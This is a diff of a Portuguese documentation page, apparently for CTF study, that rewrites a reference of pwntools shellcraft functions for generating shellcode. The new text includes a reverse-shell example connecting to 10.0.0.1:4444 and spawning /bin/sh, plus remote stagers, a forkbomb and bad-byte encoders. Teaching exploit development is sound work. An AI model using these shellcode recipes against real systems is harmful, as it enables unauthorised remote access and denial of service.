@@ -3,171 +3,135 @@ title: Principais Funções Shellcraft
 sidebar_position: 2
 ---
 
+O `shellcraft` é o módulo do pwntools que gera shellcode em assembly. Tudo o que ele retorna é **texto em assembly**: use `asm()` para transformar em bytes.
+
+```py
+from pwn import *
+context.arch = 'amd64'          # ou 'i386', 'arm', 'aarch64', ...
+
+sc = asm(shellcraft.sh())       # bytes prontos para enviar
+print(shellcraft.sh())          # mostra o assembly gerado
+```
+
+Quando `context.arch` está definido, `shellcraft.sh()` é um atalho para `shellcraft.amd64.linux.sh()` (ou o equivalente da arquitetura). A lista completa de cada arquitetura está na [documentação oficial](https://docs.pwntools.com/en/stable/shellcraft.html). Abaixo estão as funções que existem para `amd64.linux` (a maioria também existe em `i386.linux`).
+
+Dica: no terminal, `shellcraft -l amd64` lista tudo, `shellcraft amd64.linux.sh` imprime o assembly e `shellcraft -f hex amd64.linux.sh` imprime os bytes.
+
 ## Shell
 
 ```py
-# Shell
-shellcraft.sh()                    # /bin/sh
-shellcraft.dupsh()                 # Duplica shell para stdin/stdout
-shellcraft.dupsh('rbp')            # Duplica shell para fd específico
-shellcraft.findsock()              # Encontra socket aberto
-shellcraft.findpeersh()            # Encontra peer shell (socket conectado)
-shellcraft.findpeersh('rbp')       # Com registro específico
+shellcraft.sh()                    # execve("/bin///sh", ["sh"], NULL)
+shellcraft.dupsh(sock='rbp')       # dup2 do socket para stdin/stdout/stderr e depois execve de /bin/sh
+shellcraft.findpeersh(port=None)   # Acha o socket conectado à porta e abre um shell nele
+shellcraft.bindsh(port, network='ipv4')   # Escuta na porta e abre shell para quem conectar
 ```
 
-## Redes e sockets
+Para um reverse shell, combine `connect` com `dupsh`:
 
 ```py
-# Redes e sockets
-## Conexão
-shellcraft.connect('ip', port)
-shellcraft.connect('ip', port, 'af')    # Família de endereços
-
-## Bind shell
-shellcraft.bindsh(port)
-shellcraft.bindsh(port, 'af')           # Família de endereços
-shellcraft.bindshell(port)              # Alternativa
-
-## Reverse shell
-shellcraft.reverse('ip', port)
-shellcraft.reverse('ip', port, 'af')
-
-## Listener/Server
-shellcraft.listen(port)
-shellcraft.listen(port, 'af')
-
-## Socket operations
-shellcraft.sockopen()                   # Abre socket
-shellcraft.sockconnect()                # Conecta socket
-shellcraft.sockbind()                   # Bind socket
-shellcraft.socklisten()                 # Listen socket
-shellcraft.sockaccept()                 # Accept conexão
-shellcraft.sockdup()                    # Duplica socket
-shellcraft.socksend()                   # Envia dados
-shellcraft.sockrecv()                   # Recebe dados
+sc  = shellcraft.connect('10.0.0.1', 4444)   # socket conectado fica em rbp
+sc += shellcraft.dupsh('rbp')
 ```
 
-## Arquivos
+## Rede
 
 ```py
-## Operações com arquivos
-shellcraft.cat('filename')           # Lê arquivo
-shellcraft.cat('filename', fd)       # Lê para fd específico
-shellcraft.open('filename')          # Abre arquivo
-shellcraft.openat('filename')        # Openat syscall
-shellcraft.read(fd, size)            # Lê de fd
-shellcraft.write(fd, 'data')         # Escreve em fd
-shellcraft.close(fd)                 # Fecha fd
+shellcraft.connect(host, port, network='ipv4')  # Conecta e deixa o socket em rbp
+shellcraft.listen(port, network='ipv4')         # Escuta, aceita um cliente e deixa o socket em rax
+shellcraft.findpeer(port=None)                  # Acha o fd do socket conectado à porta
+shellcraft.socket(network='ipv4', proto='tcp')  # Só cria o socket
+shellcraft.recvsize(sock, reg='rcx')            # Lê 4 bytes de tamanho do socket
+shellcraft.stager(sock, size)                   # Lê `size` bytes do socket e executa (shellcode em 2 estágios)
+shellcraft.connectstager(host, port)            # connect + stager
+shellcraft.findpeerstager(port=None)            # findpeer + stager
+```
 
-## Diretórios
-shellcraft.getdents(fd)              # Lista diretório
-shellcraft.getdents64(fd)            # Lista diretório (64-bit)
-shellcraft.getcwd()                  # Diretório atual
-shellcraft.chdir('path')             # Muda diretório
+## Arquivos e I/O
 
-## Manipulação de arquivos
-shellcraft.unlink('filename')        # Remove arquivo
-shellcraft.rename('old', 'new')      # Renomeia arquivo
-shellcraft.symlink('target', 'link') # Cria symlink
-shellcraft.link('old', 'new')        # Cria hard link
+```py
+shellcraft.cat(filename, fd=1)          # Abre o arquivo e escreve no fd com sendfile (ex: ler a flag)
+shellcraft.cat2(filename, fd=1, length=0x4000)  # Igual, mas com read/write (quando sendfile não funciona)
+shellcraft.readfile(path, dst='rdi')    # Abre o arquivo e envia o conteúdo para o fd em dst
+shellcraft.echo(string, sock='1')       # Escreve uma string no fd
+shellcraft.read(fd, buf, count)         # read()
+shellcraft.readn(fd, buf, nbytes)       # Lê exatamente n bytes (em loop)
+shellcraft.readloop(fd)                 # Lê e executa repetidamente
+shellcraft.readptr(fd, reg)             # Lê um ponteiro para um registrador
+shellcraft.dupio(sock='rbp')            # dup2 do socket para 0, 1 e 2 (sem abrir shell)
 ```
 
 ## Processos
-```py
-## Controle de processos
-shellcraft.fork()                    # Fork processo
-shellcraft.vfork()                   # vfork
-shellcraft.clone()                   # Clone processo
-shellcraft.execve('path', ['args'])  # Executa programa
-shellcraft.execveat('path', ['args']) # Execveat
 
-## Sair/terminar
-shellcraft.exit()                    # Sai normalmente
-shellcraft.exit(status)              # Sai com status
-shellcraft.kill(pid, sig)            # Mata processo
-shellcraft.tkill(tid, sig)           # Mata thread
+```py
+shellcraft.forkexit()                   # fork, e o pai sai
+shellcraft.forkbomb()                   # Autoexplicativo (não use em CTF remoto, é DoS)
+shellcraft.killparent()                 # kill no processo pai
+shellcraft.sleep(seconds)
+shellcraft.setreuid(uid=None), setregid(), setresuid()   # Trocar uid/gid (ex: binário setuid)
+shellcraft.strace_dos()                 # Trava o strace (anti-debug)
 ```
 
-## Sistema
-```py
-## Informações do sistema
-shellcraft.syscall()                 # Chama syscall arbitrária
-shellcraft.getpid()                  # PID atual
-shellcraft.getppid()                 # PID do pai
-shellcraft.getuid()                  # UID real
-shellcraft.geteuid()                 # UID efetivo
-shellcraft.getgid()                  # GID real
-shellcraft.getegid()                 # GID efetivo
-shellcraft.uname()                   # Informações do kernel
+## Memória e stack
 
-## Time/Sleep
-shellcraft.sleep(seconds)            # Dorme por segundos
-shellcraft.nanosleep(seconds, nanos) # Dorme com nanosegundos
-shellcraft.alarm(seconds)            # Configura alarme
+```py
+shellcraft.mmap_rwx(size=0x1000, ...)   # Mapeia memória rwx
+shellcraft.migrate_stack(size=0x100000) # Move a stack para memória nova (mmap)
+shellcraft.egghunter(egg)               # Procura a sequência `egg` na memória (endereço fica em rdi)
+shellcraft.push(value)                  # push de um imediato (lida com bytes nulos)
+shellcraft.pushstr('string')            # Empilha string terminada em \0
+shellcraft.pushstr_array('rsi', ['sh', '-c', 'ls'])   # Empilha um array de strings (argv)
+shellcraft.mov('rax', 59)               # mov que evita bytes nulos quando possível
+shellcraft.setregs({'rax': 59, 'rdi': 'rsp', 'rsi': 0})   # Define vários registradores de uma vez
+shellcraft.memcpy(dst, src, n), strcpy(dst, src), strlen(string), itoa(v)
+shellcraft.xor(key, address, count)     # XOR em região de memória (decoder)
 ```
 
-## Memória e mapeamento
+## Syscalls
+
+Toda syscall do Linux existe como função, com o mesmo nome e os mesmos argumentos da man page. `shellcraft.syscall()` monta uma syscall qualquer.
+
 ```py
-## Alocação de memória
-shellcraft.mmap(addr, size, prot, flags)  # Mapeia memória
-shellcraft.munmap(addr, size)             # Desmapeia memória
-shellcraft.mprotect(addr, size, prot)     # Proteção de memória
-shellcraft.brk(addr)                      # Ajusta break heap
-
-## Stack operations
-shellcraft.push(value)                    # Empurra valor na stack
-shellcraft.pushstr('string')              # Empurra string
-shellcraft.pushstr_array(['str1', 'str2']) # Array de strings
-shellcraft.pusharray([1, 2, 3])           # Array de valores
-
-# I/O e redirecionamento
-## Duplicação de file descriptors
-shellcraft.dup(fd)                       # Duplica fd
-shellcraft.dup2(old, new)                # Duplica para fd específico
-shellcraft.dup3(old, new, flags)         # Dup3 com flags
-
-## Pipes
-shellcraft.pipe()                        # Cria pipe
-shellcraft.pipe2(flags)                  # Pipe2 com flags
-
-## Terminal/PTY
-shellcraft.openpty()                     # Abre pseudo-terminal
-shellcraft.login_pty()                   # Login via PTY
+shellcraft.execve('/bin/sh', ['sh'], 0)
+shellcraft.open('/flag', 0)             # fd volta em rax
+shellcraft.read(fd, buf, count)
+shellcraft.write(1, buf, count)
+shellcraft.dup2(oldfd, newfd)
+shellcraft.exit(status)
+shellcraft.mprotect(addr, len, prot)
+shellcraft.sigreturn()                  # rt_sigreturn (ver SIGROP)
+shellcraft.syscall('SYS_execve', 'rdi', 0, 0)   # Genérica
+shellcraft.syscalls.<nome>()            # Mesma coisa, pelo módulo syscalls
 ```
 
-## Específicos da arquitetura
+## Utilidades
+
 ```py
-shellcraft.i386.mov('eax', 0xdeadbeef)   # Move valor
-shellcraft.amd64.syscall()               # Syscall específica
-shellcraft.arm.mov('r0', 0x1234)         # ARM
-shellcraft.aarch64.mov('x0', 0x1234)     # AArch64
-shellcraft.mips.mov('$a0', 0x1234)       # MIPS
-shellcraft.riscv.mv('a0', 0x1234)        # RISC-V
+shellcraft.nop()                        # NOP da arquitetura (nem sempre é 0x90)
+shellcraft.ret(return_value=None)       # ret (opcionalmente definindo rax)
+shellcraft.trap()                       # int3 (breakpoint: útil para achar onde o shellcode começa no GDB)
+shellcraft.crash()                      # Crasha de propósito
+shellcraft.infloop()                    # jmp $ (loop infinito)
+shellcraft.pushad() / shellcraft.popad()    # Salva/restaura todos os registradores (emulado em amd64)
+shellcraft.amd64_to_i386()              # Troca para o modo 32 bits (shellcode "híbrido")
+shellcraft.loader(address), loader_append(data)  # Carrega e executa um ELF a partir da memória
 ```
 
-## Modificadores e flags
-```py
-# Ajustar shellcodes
-shellcraft.setregs({'rax': 1, 'rbx': 2}) # Define registradores
-shellcraft.fixup()                       # Corrige offsets
+## Encoders
 
-# Encoders
-shellcraft.encoder(shellcode)           # Codifica shellcode
-shellcraft.avoid(bytes)                 # Evita bytes específicos
+Encoders não ficam no `shellcraft`, mas em `pwnlib.encoders`. Servem para evitar bytes proibidos (`\x00`, `\n`, ...) ou para deixar o shellcode só com caracteres imprimíveis:
+
+```py
+from pwn import *
+context.arch = 'amd64'
+sc = asm(shellcraft.sh())
+
+encode(sc, avoid=b'\x00\n')             # Evita bytes específicos
+encoders.alphanumeric(sc)              # Só caracteres alfanuméricos (i386 e amd64)
 ```
 
-## Outros
-```py
-shellcraft.echo('text')                  # Imprime texto
-shellcraft.trap()                        # Instrução trap/debug
-shellcraft.int3()                        # Breakpoint (int 3)
-shellcraft.ud2()                         # Instrução undefined
-shellcraft.nop()                         # No operation
-shellcraft.ret()                         # Return
-shellcraft.infloop()                     # Loop infinito
+Para testar qualquer shellcode localmente: `run_shellcode(sc).interactive()` ou `run_assembly(shellcraft.sh())`.
 
-# Shellcodes compostos
-shellcraft.stager(url, size)             # Download e executa
-shellcraft.download(url, path)           # Download arquivo
-shellcraft.wget(url)                     # WGET-like
-```
+## Referências
+
+- [pwnlib.shellcraft - Documentação](https://docs.pwntools.com/en/stable/shellcraft.html) - Lista completa por arquitetura.
+- [pwnlib.encoders](https://docs.pwntools.com/en/stable/encoders.html) - Encoders de shellcode.
